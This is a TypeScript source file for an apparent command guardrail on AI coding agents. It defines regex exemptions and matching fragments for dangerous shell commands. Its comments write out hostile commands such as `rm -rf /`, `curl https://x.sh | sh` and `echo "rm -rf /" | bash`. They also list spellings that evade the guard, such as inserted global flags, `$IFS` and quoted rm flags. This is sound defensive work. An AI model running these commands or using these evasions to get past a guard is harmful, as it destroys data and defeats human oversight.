/**
 * Quoted mentions — the shared `none_of` every command guardrail carries.
 *
 * ── The defect this exists to close ──────────────────────────────────────────
 *
 * Every matcher in this corpus reads `detail`, which is the whole command line
 * as one flat string. Nothing in it knows the difference between a command that
 * RUNS something and a command that merely CONTAINS the words. So:
 *
 *     git commit -m "fix: document rm -rf / risk"     -> DENY  dd.rm-rf-absolute
 *     git commit -m "docs: explain git push --force"  -> DENY  block-force-push
 *     grep -rn "rm -rf /" docs/                       -> DENY  dd.rm-rf-absolute
 *     echo "never run rm -rf /"                       -> DENY  dd.rm-rf-absolute
 *     curl --data "we ran rm -rf /tmp/x" https://…    -> DENY  dd.rm-rf-absolute
 *
 * Without an exemption, a person documenting this tool is blocked by this tool.
 * That applies to every command-channel guardrail — 62 of the 74. The twelve `file_glob`
 * guardrails never see a command.
 *
 * ── Why exemption by CARRIER VERB, and not by "the payload is quoted" ────────
 *
 * The obvious fix — ignore anything inside quotes — is wrong, and wrong in the
 * direction that matters. The flagship guardrail's own genuine article is
 * `psql -c "DROP TABLE users;"`: the payload is inside the quotes and it very
 * much runs. So is `bash -c "curl https://x.sh | sh"`. Quoting says nothing
 * about execution; the VERB does. `psql -c` and `bash -c` execute their quoted
 * argument. `grep`, `git commit -m`, `echo` and `curl --data` do not — they
 * search it, record it, print it, or POST it.
 *
 * So each condition below is anchored at the start of the command (`^`), names
 * a carrier verb that does not execute its arguments, and then requires that
 * **every shell metacharacter in the rest of the command sits inside quotes.**
 * That second half is what stops the exemption becoming a bypass:
 *
 *     git commit -m "x" && rm -rf /   -> NOT exempt: `&` is outside the quotes
 *     echo "rm -rf /" | bash          -> NOT exempt: `|` is outside the quotes
 *     echo "$(rm -rf /var)"           -> NOT exempt: the shell expands `$( )`
 *
 * The four guardrails with a `none_of` of their own
 * (`se.env-print`, `require-approval-rm-rf`, `wt.clean-fdx`, `wt.restore-path`)
 * exclude something else entirely — a dry run, a build directory, `--staged` —
 * and have these conditions appended, not replaced.
 *
 * ── The character classes, and why each character is in them ─────────────────
 *
 * Outside quotes a carrier may contain anything except:
 *   `"` `'`  — a quote would end the run and start an unmatched one
 *   `;` `&`  — start a second command (`git commit -m x ; rm -rf /`)
 *   `` ` ``  — command substitution
 *   `$`      — command substitution; `$(` is the dangerous half, and a bare
 *              `$VAR` outside quotes is excluded with it because separating the
 *              two outside a quoted run buys nothing
 *   `<` `>`  — redirection, including the `>> ~/.zshrc` persistence shape and
 *              the `>> known_hosts` bypass shape two guardrails match on
 *   `(` `)`  — subshell
 *
 * `|` is excluded too. A pipe after a carrier is allowed only into a READER: one of
 * the quiet tools below, or `sort`, `uniq`, `cut` or `less` with short flags and
 * nothing else. What
 * a search, `git log` or `curl` prints is text the command did not write: matched
 * lines, history, an HTTP response. Piped into a reader it is only looked at, and
 * `grep x . | head` is far too ordinary to deny. Piped anywhere else it can be run
 * or written, so these are NOT exempt:
 *
 *     grep -rl x /srv | xargs rm -rf        the matched names are deleted
 *     grep -h "…" notes.md | bash           the matched text is executed
 *     git show HEAD:x | sponge deploy.sh    the text is written to a script
 *     grep "…" x | sort -o run.sh           sort with an operand writes a file
 *     grep "…" x | less '+!sh'              less runs a command given as `+!…`
 *
 * After `echo` or `printf` the pipe consumes the payload itself
 * (`echo "rm -rf /" | bash`), which the same rule covers.
 *
 * Inside a double-quoted run the shell still expands, so `` ` `` and `$(` are
 * excluded there too; a bare `$VAR` is allowed, because a real command
 * (`curl -H "Authorization: Bearer $TOKEN" -d '…'`) is otherwise never exempt.
 * A single-quoted run may contain anything: POSIX single quotes suppress every
 * expansion.
 *
 * ── Honest coverage limits ──────────────────────────────────────────────────
 *
 * - The carrier need not be the first word: it may follow, and be followed by, up
 *   to two QUIET segments — read-only inspection commands (`wc`, `cat`, `head`,
 *   `tail`, `ls`, `grep`/family, `rg`) separated by `;`, `&&`, `||` or a pipe — so
 *   `wc -l < log; echo "…rm -rf /…"; grep -c x log` is exempt. That is sound
 *   because a quiet segment provably neither writes nor executes: `sort` (`-o`,
 *   `--compress-program`), `find` (`-exec`), `awk`/`sed`, `tee`/`dd` and `git`
 *   (`push`/`reset`) are NOT quiet, so `git commit -m "x" && rm -rf /`,
 *   `echo "…" | bash` and `sort … ; echo …` all still deny. After a carrier that starts
 *   the command, `sort`, `uniq`, `cut` and `less` also count, with short flags and no
 *   operand. A quiet segment carries
 *   no quote, so it cannot hide a mention; the mention is in the CARRIER. When quiet
 *   segments come BEFORE the carrier, only the shell carriers count (`grep`/family,
 *   `rg`, `ag`, `ack`, `git commit|log|show`, `echo`, `printf`, `curl`, `wget`) and
 *   no `sudo`. A single leading `sudo` before a carrier that starts the command is
 *   still tolerated (it changes privilege, not meaning; `ps.sudo-write` fires on
 *   `sudo tee|dd|cp|mv|rm|ln|install|chown|chmod|sh`, none a carrier). A RUNNER prefix
 *   is not tolerated: `pnpm exec rg …`, `npx …` and
 *   `xargs -0 grep …` are not exempt, because "some program eventually execs a
 *   search" is a much weaker claim than "this command is a search".
 * - At most four quoted arguments are recognised. A fifth is not exempt.
 * - A carrier that can be made to EXEC through a flag is still exempt.
 *   `ack --pager='…'` and `rg --pre <cmd>` run a program; nothing here reads
 *   flags, so a dangerous string in one of those positions is treated as a
 *   mention. This is the same class the README already names ("nothing a wrapper
 *   hides"), and it is not closed here: doing so needs an argv the evaluator does
 *   not have, and a flag DENY-list would be a new thing to keep current. The same
 *   holds for `git grep -O<pager>` (`--open-files-in-pager`), for an `rg --pre <cmd>`
 *   in a quiet segment after the carrier, and for `less -k<file>`, which loads key
 *   bindings from a file that can bind a key to a shell command.
 * - `-d "$(cat body.json)"` is not exempt: the substitution runs.
 * - A double-quoted payload containing an unescaped `"` ends the run early.
 * - Only the shell channel. An MCP tool whose serialized input carries the same
 *   text (`{"body":"… rm -rf / …"}`) does not start with a carrier verb and is
 *   NOT exempt. That is the same defect on a different channel and it is not
 *   fixed here — exempting a JSON blob would exempt a shell-running MCP server
 *   with it.
 *
 * ── Why a shared constant rather than 48 copies ─────────────────────────────
 *
 * A per-guardrail `none_of` written 48 times is 48 chances to drift, and the drift is
 * invisible: a guardrail with a slightly weaker exemption still passes every test it
 * owns. One frozen object referenced 48 times cannot drift, costs nothing in the
 * bundle (esbuild emits it once), and makes an opt-out a VISIBLE line of code —
 * see the five guardrails that take a subset, each because the carrier it drops is
 * its own trigger verb.
 */

import type { MatchCondition } from "./schema.js";

/**
 * The `label` glob for a guardrail that reads a COMMAND: the two shells plus any MCP tool.
 *
 * A command-channel guardrail describes a shape — `git push --force`, `rm -rf /` — and
 * that shape reaches the guard on more than one tool. Claude Code's own hooks route
 * `Bash`, `PowerShell` AND `mcp__*` to the guard, and the MCP channel carries the
 * serialized tool input as the same `detail` text every command matcher reads. A
 * guardrail pinned to `{Bash,PowerShell}` alone silently ignores the MCP channel, so an
 * MCP server that runs shell commands is unguarded. This glob widens the label to
 * the MCP tools as well, and is referenced rather than copied so the set cannot
 * drift guardrail to guardrail.
 *
 * `mcp__*` matches the WHOLE label (picomatch matches the entire tool name), so it
 * catches any `mcp__<server>__<tool>` — including Cursor's `mcp__cursor__*` — and
 * nothing else. It does NOT widen the `none_of` exemptions, which stay anchored to
 * the shell: a quoted MENTION is a shell shape, and an MCP tool's serialized JSON
 * does not start with a carrier verb, so a command shape inside an MCP payload is
 * matched, not exempted. Whether that shape is an execution or only a field named
 * like one is a limit the README states, not one this glob can tell apart.
 */
export const SHELL_AND_MCP = "{Bash,PowerShell,mcp__*}";

/**
 * The curly quotes U+2018 to U+201F, as a character-class range. PowerShell reads each
 * of them as a quote, so a run that holds one may end where the pattern does not see it
 * end. They are written as the characters themselves, not `\u` escapes, so each costs
 * one character of the pattern length limit.
 */
const CURLY = "‘-‟";

/**
 * Text outside a quoted run in a carrier. Excludes both quote characters and every
 * shell metacharacter, `|` included: a pipe out of a carrier is matched only by the
 * trailing segments, and only into a reader. A line break outside quotes ends the
 * command as `;` does, so `\n` is excluded, and `\r`, which PowerShell also reads as a
 * line break (inside quotes either is part of the text). A backslash is excluded
 * because it makes the next character literal: `\"` and `\'` do not open a quoted run.
 * The curly quotes are excluded as quotes.
 */
const OUTSIDE = `[^"'|;&\`$<>()\\n\\r\\\\${CURLY}]`;

/**
 * One quoted argument: double-quoted with no expansion (`` ` `` / `$(` barred,
 * a bare `$VAR` allowed), or single-quoted with anything else in it. A curly quote
 * inside either run ends it in PowerShell, so a run holding one is not a quoted run.
 */
const QUOTED = `(?:"(?:[^"\`$${CURLY}]|\\$[^("${CURLY}])*"|'[^'${CURLY}]*')`;

/**
 * A read-only inspection tool: it reads, counts or searches, and — unlike `sort`
 * (`-o`, `--compress-program`), `find` (`-exec`, `-delete`), `awk`/`sed` (which run
 * programs), `tee`/`dd` (which write) or `git` (which can push/reset) — has no flag
 * that writes a file or runs another program. That is what lets a compound command
 * built only from these AROUND a carrier be exempt without hiding an execution.
 */
const QUIET_TOOL = "(?:wc|cat|head|tail|ls|e?grep|rg)";

/**
 * One quiet segment: a read-only tool and arguments with no quote, pipe, command
 * separator, substitution, subshell, or write-redirect. A read-redirect `<` is
 * allowed (`wc -l < log`); `>` is not, and `(` bars a `<(…)` process substitution.
 * It carries no quote, so it cannot hold a quoted mention — the mention lives in the
 * CARRIER segment; these only surround it. The tool name is a whole word followed by
 * a space, a tab or the end: `cat=1 xargs …` is an environment assignment and
 * `head/../bin/xargs` is a path, and neither runs the quiet tool.
 */
const QUIET_SEG = `${QUIET_TOOL}(?:[ \\t][^"'|;&\`$>()\\n\\r${CURLY}]*)?`;

/**
 * `sort`, `uniq`, `cut` or `less` reading stdin, with short flags only.
 *
 * No operand and no long flag, so `sort -o file` (writes), `sort --compress-program=…`
 * (runs a program), `uniq in out` (writes its second operand) and `less +!cmd` (runs a
 * command) are not readers. `o` is left out of the flag letters for the same reason
 * (`sort -o`, `less -o` log file). Flags are separated by spaces or tabs only, never a
 * line break. Used only after a carrier, never before one.
 */
const FLAG_ONLY_READER = "(?:sort|uniq|cut|less)(?:[ \\t]+-[a-np-z\\d:,.]{1,10}){0,4}[ \\t]*";

/** A separator between segments: `;`, `&&`, `||`, or a pipe (`|` or `|&`). */
const CHAIN = "(?:;|&&|\\|[|&]?)";

/**
 * Up to two quiet segments BEFORE the carrier (each ending in a separator), and up
 * to two AFTER it. This is what lets a NON-LEADING carrier be exempt — `wc -l < log;
 * echo "…"; grep -c x log` — without becoming a bypass: every OTHER segment must
 * itself be a quiet read-only command, so `git commit -m "x" && rm -rf /` (the `rm`
 * is not quiet), `echo "…" | bash` (`bash` is not quiet), `echo "$(…)"` (the
 * substitution is barred inside the quote) and `sort … ; echo …` (`sort` can write)
 * are all still denied. Bounded `{0,2}`, so the fragment stays linear (no nested
 * unbounded quantifier) and inside the length cap.
 *
 * Whitespace before a separator is matched by the text before it (`OUTSIDE`, a quiet
 * segment's arguments or a reader's trailing blanks), never by a separate `\s*`. Two
 * owners for the same run of blanks would let the engine try every split of it, which
 * is quadratic in its length.
 */
const LEAD = `(?:${QUIET_SEG}${CHAIN}\\s*){0,2}`;
const TRAIL = `(?:${CHAIN}\\s*${QUIET_SEG}){0,2}`;

/**
 * Up to three segments after a carrier that STARTS the command: quiet tools, or
 * {@link FLAG_ONLY_READER}, so `… | sort | uniq -c | sort -rn` is exempt. A separate
 * pattern from the one with {@link LEAD}, because one pattern holding both is longer
 * than the 320-character limit.
 */
const TRAIL_READERS = `(?:${CHAIN}\\s*(?:${QUIET_SEG}|${FLAG_ONLY_READER})){0,3}`;

/** Up to four quoted arguments separated by safe text, then a safe tail, then the trail. */
const args = (trail = TRAIL) => `(?:${OUTSIDE}*${QUOTED}){0,4}${OUTSIDE}*${trail}$`;

/** As {@link args}, but at least one quoted argument is required. */
const quotedArgs = (trail = TRAIL) => `(?:${OUTSIDE}*${QUOTED}){1,4}${OUTSIDE}*${trail}$`;

/**
 * The two patterns of one carrier.
 *
 * The first: quiet segments may come before and after it. It names the shell carriers
 * only (`leadWords`) and takes no `sudo`, which keeps it inside the length limit.
 * The second: the carrier starts the command, optionally after one `sudo`, and its
 * output may also pass through `sort`, `uniq`, `cut` or `less`. It names every carrier.
 *
 * In both, the carrier word must be followed by a space or a tab. `grep=1 …` is an
 * environment assignment and `grep/../…` is a path, and neither runs the carrier; a
 * carrier with nothing after it mentions nothing, so requiring a blank costs nothing.
 */
const carrier = (words: string, leadWords: string, tail: (trail?: string) => string): string[] => [
  `^\\s*${LEAD}${leadWords}[ \\t]${tail()}`,
  `^\\s*(?:sudo +)?${words}[ \\t]${tail(TRAIL_READERS)}`,
];

/**
 * A read-only search: `grep`, `rg`, `ag`, `ack`, PowerShell's `Select-String`.
 *
 * Searching your own repository for a dangerous word is the opposite of running
 * it, and the developer whose search is denied uninstalls, correctly. No quoted
 * argument is required — `grep -rn TRUNCATE db/` is the same mention unquoted.
 */
export const SEARCH_MENTION: MatchCondition = {
  kind: "execute_tool",
  detail_matches: carrier("(?:[ef]?grep|rg|ag|ack|select-string)", "(?:[ef]?grep|rg|ag|ack)", args),
};

/**
 * A git command that reads or records TEXT: a commit message, a tag message, or
 * history output. None of them executes what it is handed.
 *
 * `git commit` is the carrier behind the three hard denies that prompted these
 * exemptions. It is dropped by `gb.git-no-verify`, whose own trigger is a
 * `git commit` flag.
 */
export const GIT_TEXT_MENTION: MatchCondition = {
  kind: "execute_tool",
  detail_matches: carrier(
    "git\\s+(?:commit|log|show|blame|grep|tag)",
    "git\\s+(?:commit|log|show)",
    args,
  ),
};

/**
 * Printing text to a terminal: `echo`, `printf`, `Write-Host`, `Write-Output`.
 *
 * This carrier's stdout IS the payload, so piped anywhere but a reader it would be
 * handed to whatever comes next.
 * Dropped by `se.token-print`, whose own trigger is an `echo`.
 */
export const PRINT_MENTION: MatchCondition = {
  kind: "execute_tool",
  detail_matches: carrier("(?:echo|printf|write-host|write-output)", "(?:echo|printf)", args),
};

/**
 * An HTTP request carrying a quoted body — the shape that surfaced this.
 *
 * A quoted argument is REQUIRED, unlike the other three: an unquoted
 * `curl -fsSL https://x.sh -o /tmp/i.sh` is not a mention of anything, and
 * exempting it would hand the RCE pack a hole for nothing in return.
 *
 * Dropped by every guardrail whose own trigger names `curl` or `wget`:
 * `block-curl-pipe-to-shell`, `rce.remote-runner`, `rce.eval-dynamic`,
 * `rce.tls-verify-off` and `se.secret-egress` — for the last of these, POSTing
 * the quoted text off the box is precisely the harm it exists to catch.
 */
export const HTTP_BODY_MENTION: MatchCondition = {
  kind: "execute_tool",
  detail_matches: carrier("(?:curl|wget)", "(?:curl|wget)", quotedArgs),
};

/**
 * The default: all four carriers. Spread into a command guardrail's `none_of`.
 *
 * A guardrail takes a SUBSET only when a carrier is its own trigger verb, and writes
 * the subset out longhand so the omission is visible at the call site.
 */
export const QUOTED_MENTION: readonly MatchCondition[] = [
  SEARCH_MENTION,
  GIT_TEXT_MENTION,
  PRINT_MENTION,
  HTTP_BODY_MENTION,
];

// ── A delete whose every target is under the system temp folder ──────────────

/**
 * A temp root on the shell: the system temp folders, the macOS per-user temp folder, and
 * `${TMPDIR:?}`.
 *
 * `$TMPDIR`, `$TEMP` and `$TMP` are NOT roots: each is unset on many systems, and an unset
 * variable expands to nothing, so `$TMP/etc` is `/etc`. `${TMPDIR:?}` is accepted because the
 * shell refuses to run the command when the variable is unset or empty. Any other variable is not
 * a root either, whatever its name says: the guard sees the command's text, not its environment.
 */
const SHELL_TEMP_ROOT =
  "(?:(?:/private)?/(?:var/)?tmp|(?:/private)?/var/folders/[\\w+-]{1,8}/[\\w+-]{1,40}/T|\\$\\{TMPDIR:\\?\\})";

/**
 * One path segment on the shell, after a `/`. Never a character the shell expands or treats
 * specially: no variable, quote, substitution, redirection, separator, backslash escape, brace
 * expansion or glob (`* ? [ ] { }`), because each of those can turn the text into a path the
 * pattern did not see (`{..,x}` expands to `..`, `.\.` is `..`, `.[.]` globs to `..`).
 */
const SHELL_TEMP_SEG = "[^\\s/\\\\;&|<>`$'\"(){}\\[\\]?*!\\x00]{1,99}";

/** One shell target: no `..` anywhere in it, a root, then at least one segment. */
const SHELL_TEMP_TARGET = `(?!\\S*\\.\\.)${SHELL_TEMP_ROOT}(?:/${SHELL_TEMP_SEG}){1,24}/?`;

/**
 * One segment of a Windows temp target: ASCII letters, digits, `.`, `_` and `-`, and nothing else.
 * Never `.` alone, which names the folder it sits in.
 *
 * This form is read under two labels, so every character must mean the same thing to both:
 * PowerShell (Claude Code's tool, and Cursor's Shell on Windows, which reaches the engine as
 * `Bash`) and a POSIX shell (Claude Code's `Bash` tool). None of these characters is special to
 * either: no space, quote, variable, escape, glob (`* ? [ ]`), brace, `,` (a PowerShell array),
 * `:` (a drive or provider path), `~`, control character, U+0085 or any other non-ASCII character.
 */
const WIN_TEMP_SEG = "(?!\\.(?:\\\\|[ \\t]|$))[A-Za-z0-9._-]{1,99}";

/**
 * A Windows temp root: `<drive>:\Users\<name>\AppData\Local\Temp` or `<drive>:\Windows\Temp`. The
 * user name is letters, digits, `_`, `.` and `-`, not starting with `.`.
 *
 * `\` is the only separator, here and between segments. On PowerShell it separates the path. On a
 * POSIX shell a backslash before a name character is an escape that disappears, so the whole
 * target becomes ONE file name in the working directory, the parts run together with no
 * separator: it can never split into a second target or reach another folder. A `/` would make it a real relative
 * path there, so `/` is not accepted, and neither is a trailing `\`, which a POSIX shell reads as
 * escaping the character after it.
 *
 * `$env:TEMP` and `$env:TMP` are NOT roots: PowerShell also runs on macOS and Linux, where both
 * are normally unset and expand to nothing, so `$env:TMP/etc` would be `/etc`. `$TEMP` and `$TMP`
 * without `env:` are ordinary variables and normally unset everywhere.
 */
const WIN_TEMP_ROOT =
  "[a-z]:\\\\(?:users\\\\[A-Za-z0-9_-][A-Za-z0-9._-]{0,63}\\\\appdata\\\\local|windows)\\\\temp";

/** One Windows target: no `..` anywhere in it, a root, then at least one segment. */
const WIN_TEMP_TARGET = `(?!\\S*\\.\\.)${WIN_TEMP_ROOT}(?:\\\\${WIN_TEMP_SEG}){1,24}`;

/**
 * A command that is ONE delete whose every target is strictly inside the system temp folder,
 * and nothing else: `rm` or `unlink` on Bash with a POSIX temp target, or `Remove-Item`, one of
 * its aliases or `rm` with a Windows temp target on either label, its flags, then one to twelve
 * targets. Spread into the `none_of` of a guardrail that holds or
 * blocks deletes, so clearing a scratch checkout under temp is not held.
 *
 * Anchored at both ends, which is what keeps it narrow:
 *
 *     rm -rf /tmp/review-1                      exempt
 *     rm -rf ${TMPDIR:?}/build /tmp/out         exempt: every target is under temp
 *     rm -rf /tmp                               NOT exempt: the bare root, not something in it
 *     rm -rf /tmp/a /srv/data                   NOT exempt: the second target is not under temp
 *     rm -rf /tmp/a && rm -rf /srv/data         NOT exempt: a second command follows
 *     rm -rf /tmp/x/../../etc                   NOT exempt: `..` appears in the target
 *     rm -rf /tmp/{..,x}/etc                    NOT exempt: brace expansion
 *     rm -rf /tmp/$X                            NOT exempt: a variable may hold `..`
 *     rm -rf $TMP/etc                           NOT exempt: `$TMP` may be unset
 *
 * Not part of {@link QUOTED_MENTION}: it is an exemption about WHERE a delete lands, so each
 * guardrail that takes it names it at its call site.
 *
 * Limits: it decides on the text alone. A symbolic link inside temp that points out of it, and a
 * `TMPDIR` set to a folder that is not temp, are still exempt. Patterns are matched
 * without regard to case, so `/TMP/x` is exempt too, which on a case-sensitive file system is a
 * folder other than `/tmp`. A `cd` into temp followed by a relative delete, a quoted target, a
 * glob, any name containing `..`, an MCP tool's input, and two temp deletes chained in one command
 * are not exempt, because the text does not show the target strictly under temp.
 */
export const TEMP_DELETE: readonly MatchCondition[] = [
  {
    kind: "execute_tool",
    label: "Bash",
    detail_matches: [
      `^\\s*(?:rm|unlink)(?:[ \\t]+-{1,2}[a-z][a-z-]{0,24}){0,8}(?:[ \\t]+--)?(?:[ \\t]+${SHELL_TEMP_TARGET}){1,12}[ \\t]*$`,
    ],
  },
  {
    // The Windows temp folder, under both labels: Cursor's Shell runs PowerShell on Windows and
    // reaches the engine as `Bash`, so the two agents decide a Windows temp delete the same way.
    // Flags only after `Remove-Item`, `ri` or `rm`, and single-dash only: `cmd`'s `del` and `rd`
    // read `-s` as a file name, and PowerShell binds an unknown `--name` as a path.
    kind: "execute_tool",
    label: "{Bash,PowerShell}",
    detail_matches: [
      `^\\s*(?:(?:remove-item|ri|rm)(?:[ \\t]+-[a-z][a-z-]{0,24}){0,8}|del|rd|rmdir)(?:[ \\t]+${WIN_TEMP_TARGET}){1,12}[ \\t]*$`,
    ],
  },
];

// ── Leading global flags, between a tool and its subcommand ──────────────────

/**
 * Zero or more global flags sitting between a command and its subcommand.
 *
 * A command-channel guardrail that pins a tool to its subcommand CONTIGUOUSLY —
 * `git\s+reset`, `aws\s+s3`, `kubectl\s+delete`, `docker\s+volume` — is defeated
 * by a global flag slipped in between them. The subcommand no longer follows the
 * tool, so the guardrail stops matching and the action runs unguarded:
 *
 *     git -C /repo reset --hard        git --no-pager …   git -c core.x=y …
 *     git --work-tree=/x …             aws --profile p …  aws --region r …
 *     kubectl -n prod delete …         docker --context c …   docker -H … …
 *     terraform -chdir=/x apply …      helm -n ns …       npm --silent …
 *
 * This constant is the ONE shared fix for that whole class, referenced rather
 * than copied so a guardrail cannot drift to a weaker spelling. It is spliced in RIGHT
 * AFTER the tool name and BEFORE the `\s+` that precedes the subcommand:
 * `\\bgit${LEADING_FLAGS}\\s+reset\\s+--hard\\b`. Empty (zero flags) it collapses
 * back to the original `tool\s+subcommand`, so the plain form still matches.
 *
 * The forms it tolerates, each as one unit that may repeat:
 *   `--no-pager` / `--silent`         a bare long flag
 *   `-C /repo` / `-n prod`            a short flag with a separate value
 *   `-c core.pager=cat`               a short flag whose value carries `=`
 *   `--work-tree=/x` / `-chdir=/x`    a flag with an attached `=value`
 *   `--profile prod` / `--context c`  a long flag with a separate value
 *
 * ── Bounded on purpose ───────────────────────────────────────────────────────
 *
 * Every quantifier is bounded — the run repeats at most a handful of times and
 * each token has a capped length — so the fragment is linear and cannot backtrack
 * catastrophically. A regex whose repetition nests an unbounded quantifier is
 * rejected at parse time; this stays well inside that limit and the length cap.
 *
 * ── What it does NOT cover ───────────────────────────────────────────────────
 *
 * It reads flag SHAPE, not meaning: it cannot tell a flag that consumes the next
 * word as its value from the subcommand itself, so a value token is required not
 * to begin with `-`, which lets a bare flag followed by the subcommand still
 * resolve to the subcommand. It does not cross a shell metacharacter, and it does
 * not read a flag that itself runs another program. An absolute tool path
 * (`/usr/bin/git`) already matches through the `\b` anchor every tool carries;
 * this fragment only closes the gap between the tool and its subcommand.
 */
export const LEADING_FLAGS =
  "(?:\\s+-{1,2}[A-Za-z][\\w-]{0,24}(?:=\\S{1,40})?(?:\\s+[^-\\s]\\S{0,40})?){0,6}";

// ── The arguments of one rm invocation ───────────────────────────────────────

/**
 * The start of an `rm` word.
 *
 * Start of text, or any character that is not a word character, a dot or a dash. A
 * slash admits a tool path (`/bin/rm`), a backslash admits `\rm`, a quote or `(`
 * admits `bash -c "…"` and a subshell, and whitespace admits `sudo`, `env`, `xargs`
 * and `git`. The dash is excluded so a container runtime's `--rm` flag is not read as
 * the command, and the dot so `.rm` is not either.
 */
export const RM_WORD = "(?:^|[^\\w.-])rm";

/** One argument: no blank, command separator or redirection inside it. */
const RM_ARG = "[^\\s;&|<>]{1,200}";

/**
 * Zero to twelve arguments of the same `rm`, flags and operands in any order.
 *
 * Arguments are separated by spaces or tabs only, never a newline, so a scan cannot
 * run from one line's `rm` into the next line's path. A redirection target is not an
 * argument (`<` and `>` are outside `RM_ARG`), and `; & |` end the scan. `--` is an
 * ordinary argument here, so "flags, `--`, target" needs no special case.
 *
 * Bounded like `LEADING_FLAGS`: twelve arguments of at most 200 characters, so the
 * repetition never nests an unbounded quantifier.
 */
export const RM_ARGS = `(?:[ \\t]+${RM_ARG}){0,12}`;

/** The rest of an argument that has already started. */
export const RM_ARG_REST = "[^\\s;&|<>]{0,200}";

/** A recursive flag: a short cluster holding `r` (`R` too, patterns are case-insensitive), or the long form. */
export const RM_RECURSIVE = "(?:-[a-z]{0,8}r[a-z]{0,8}|--recursive)";

/** The end of an argument. */
export const ARG_END = "(?:[ \\t;&|)]|$)";

// ── Spellings the shell reads as the same command ────────────────────────────

/**
 * A separator between words on any shell: whitespace, U+0085 (which PowerShell reads as
 * whitespace and `\s` does not match), and bash's `$IFS` / `${IFS}`.
 */
export const SEP = "(?:[\\s\\x85]|\\$\\{?ifs\\}?)";

/** Bash's `$IFS` or `${IFS}`, used in place of a blank. */
export const IFS = "\\$\\{?ifs\\}?";

/**
 * A recursive `rm` flag written so the shell still reads it as one: quotes, backslashes or
 * braces inside it (`'-rf'`, `-r"f"`, `\-rf`, `-{r,f}`, `$'-rf'`), up to 16 before the dash and
 * 32 inside, or a `--r…` prefix of `--recursive`, which GNU's option parser accepts. The curly
 * quotes count too: PowerShell reads them as quotes, and in bash they only add a match.
 */
export const RM_RECURSIVE_QUOTED = `(?:["'\\\\$${CURLY}]{0,16}-[a-z"'\\\\{},${CURLY}]{0,32}r[a-z"'\\\\{},${CURLY}]{0,32}|["'\\\\${CURLY}]{0,16}--r[a-z]{0,8}["'${CURLY}]?)`;

/** An `rm` argument whose value is a variable or a substitution, known only at run time. */
export const RM_VARIABLE = "[\"']?(?:\\$|`)[^\\s;&|<>]{0,200}";

/** PowerShell's parameter dash: `-`, or the en dash, em dash or horizontal bar it reads as one. */
export const PWSH_DASH = "[-\\u2013\\u2014\\u2015]";
